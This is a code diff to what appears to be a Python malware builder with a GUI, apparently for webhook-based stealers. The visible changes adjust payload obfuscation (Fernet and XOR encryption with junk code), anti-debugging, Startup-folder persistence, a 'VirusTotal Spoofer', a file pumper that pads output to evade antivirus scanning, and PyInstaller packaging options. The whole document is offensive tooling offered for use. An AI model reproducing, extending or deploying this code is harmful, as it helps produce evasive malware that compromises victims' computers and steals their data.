@@ -46,7 +46,7 @@ ascii_logo = r"""
 ░░▒ ▒ ░ ▒ ▒ ░▒░    ▓██ ░▒░   ▒   ▒▒ ░
 ░ ░ ░ ░ ░ ░ ░ ░    ▒ ▒ ░░    ░   ▒   
   ░ ░     ░   ░    ░ ░           ░  ░
-░                  ░ ░                             
+░                  ░ ░               
 """
 
 lines = [
@@ -222,14 +222,14 @@ def obfuscate_code(script_content: str, output_name: str):
         log_error("Obfuscation failed: Fernet encryption returned empty")
         return None
 
-    encrypted_data_repr = repr(encrypted_data)  # ← Musi być po udanym szyfrowaniu
+    encrypted_data_repr = repr(encrypted_data)
 
     junk_code = genjunk(random.randint(20, 50))
 
     fernet_key_var = gen_random_string(12)
     xor_key_var = gen_random_string(12)
     cipher_var = gen_random_string(12)
-    xor_decrypted_var = gen_random_string(12)  # ← dodaj to
+    xor_decrypted_var = gen_random_string(12)
     decrypted_var = gen_random_string(12)
     decompressed_var = gen_random_string(12)
     decoded_var = gen_random_string(12)
@@ -240,6 +240,7 @@ import ctypes
 import base64
 import zlib
 from cryptography.fernet import Fernet
+from datetime import datetime, timezone
 
 def _anti_debug():
     try:
@@ -363,7 +364,7 @@ def log(text, sleep=None):
         with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
             f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> {{text}}\\n")
         if sleep: zzz(sleep)
-    except Exception as e:
+    except:
         pass
 
 def check_anti_spam():
@@ -436,7 +437,7 @@ def minimize_console():
     startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "{startup_filename}")
     try:
         if not {startup_check}:
-            log("Add to Startup skipped: Only .exe files can be added to Startup unless self-destruct is enabled")
+            log("Add to Startup skipped: Only .exe files can be added to startup unless self-destruct is enabled")
             return
         startup_dir = os.path.dirname(startup_path)
         if not os.path.exists(startup_dir):
@@ -614,8 +615,21 @@ if __name__ == "__main__":
                 # Pump .py file directly
                 current_size = os.path.getsize(output_path)
                 if current_size < pump_size_bytes:
-                    with open(output_path, 'ab') as f:
-                        f.write(b'X' * (pump_size_bytes - current_size))
+                    if not os.access(output_path, os.W_OK):
+                        log_error(f"File pumper: No write permission for {output_path}")
+                        messagebox.showerror("Error", f"No write permission for {output_path}. Check builder_errors.log in TEMP directory.")
+                        cleanup_files(output_name, include_temp=False)
+                        return False
+                    comment_line = "#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+                    bytes_per_line = len(comment_line.encode('utf-8')) + 1  # +1 for newline
+                    lines_needed = (pump_size_bytes - current_size) // bytes_per_line
+                    remainder_bytes = (pump_size_bytes - current_size) % bytes_per_line
+                    with open(output_path, 'a', encoding='utf-8') as f:
+                        f.write('\n')
+                        for _ in range(int(lines_needed)):
+                            f.write(comment_line + '\n')
+                        if remainder_bytes > 0:
+                            f.write(comment_line[:remainder_bytes] + '\n')
                     final_size = os.path.getsize(output_path)
                     log_error(f"File pumped to {final_size} bytes")
                 else:
@@ -638,28 +652,28 @@ if __name__ == "__main__":
                 log_error(f"Could not find {dll} in {pywin32_dir}. DLL will not be bundled.")
         pyinstaller_cmd = [
             "pyinstaller",
-            "--onefile", "--noconsole",
-            "--hidden-import=psutil",
+            "--onefile", "--clean", "--noconsole", "--noupx",
+            "--workpath=pyinstaller_temp",
+            "--hidden-import=base64",
+            "--hidden-import=json",
             "--hidden-import=requests",
             "--hidden-import=pywin32",
             "--hidden-import=win32gui",
             "--hidden-import=win32con",
-            "--hidden-import=wmi",
-            "--hidden-import=pythoncom",
-            "--hidden-import=cryptography",
-            "--hidden-import=cryptography.fernet",
-            "--hidden-import=zlib",
-            "--hidden-import=ctypes.wintypes",
-            "--hidden-import=base64",
-            "--hidden-import=json",
+            "--hidden-import=win32api",
+            "--hidden-import=win32file",
             "--hidden-import=sys",
             "--hidden-import=time",
             "--hidden-import=os",
             "--hidden-import=shutil",
             "--hidden-import=subprocess",
             "--hidden-import=ctypes",
+            "--hidden-import=ctypes.wintypes",
             "--hidden-import=datetime",
             "--hidden-import=uuid",
+            "--hidden-import=cryptography",
+            "--hidden-import=cryptography.fernet",
+            "--hidden-import=zlib",
         ] + pywin32_dlls + [
             f"--name={output_name}",
             "--distpath=.",
@@ -771,7 +785,7 @@ def create_builder_gui():
     output_entry = customtkinter.CTkEntry(
         root, width=300, height=28, corner_radius=5,
         font=customtkinter.CTkFont(size=13, family="Arial"),
-        placeholder_text=f"shadow_{uuid.uuid4().hex[:8]}"
+        placeholder_text="github.com/guapguap"
     )
     output_entry.grid(row=1, column=1, sticky="w", padx=8, pady=4)
     output_entry.bind("<KeyRelease>", lambda event: update_build_state())
@@ -875,7 +889,7 @@ def create_builder_gui():
     spoof_virustotal_check = customtkinter.CTkCheckBox(
         root, text="VirusTotal Spoofer", font=customtkinter.CTkFont(size=13, family="Arial"),
         fg_color="#8B0000", hover_color="#4B0000", variable=spoof_virustotal_var,
-        command=lambda: update_config("spoof_virustotal", spoof_virustotal_var.get())
+        command=lambda: update_config_and_pumper()
     )
     spoof_virustotal_check.grid(row=8, column=1, sticky="w", padx=8, pady=4)
 
@@ -939,7 +953,7 @@ def create_builder_gui():
         root.update()
         global file_type
         file_type = file_type_var.get()
-        success = generate_script(
+        generate_script(
             webhook_entry.get(), output_name,
             fake_error_var.get(), add_startup_var.get(),
             webhook_name_entry.get(), webhook_pfp_entry.get(),
@@ -947,13 +961,6 @@ def create_builder_gui():
             file_pumper_var.get(), pump_size_var.get(), anti_spam_var.get(),
             ping_var.get(), ping_type_var.get(), spoof_virustotal_var.get()
         )
-        build_button.configure(text="Build", fg_color="#8B0000")
-        if success:
-            if file_type == "pyinstaller":
-                messagebox.showinfo("Success", f"Build started! Check for {output_name}.exe in the current directory. A command window will close automatically when done.")
-            else:
-                messagebox.showinfo("Success", f"Build completed! Check for {output_name}.py in the current directory.")
-        root.update()
         after_id = root.after(800, lambda: build_button.configure(text="Build", fg_color="#8B0000"))
         after_ids.append(after_id)
 
@@ -969,8 +976,13 @@ def create_builder_gui():
             after_id = root.after(100, check_webhook_action)
             after_ids.append(after_id)
 
+    def update_config_and_pumper():
+        update_config("spoof_virustotal", spoof_virustotal_var.get())
+        update_pumper_state()
+
     def update_pumper_state():
-        pump_size_menu.configure(state="normal" if file_pumper_var.get() and not spoof_virustotal_var.get() else "disabled")
+        file_pumper_check.configure(state="normal")
+        pump_size_menu.configure(state="normal" if file_pumper_var.get() else "disabled")
         update_config("file_pumper", file_pumper_var.get())
 
     def update_ping_state():
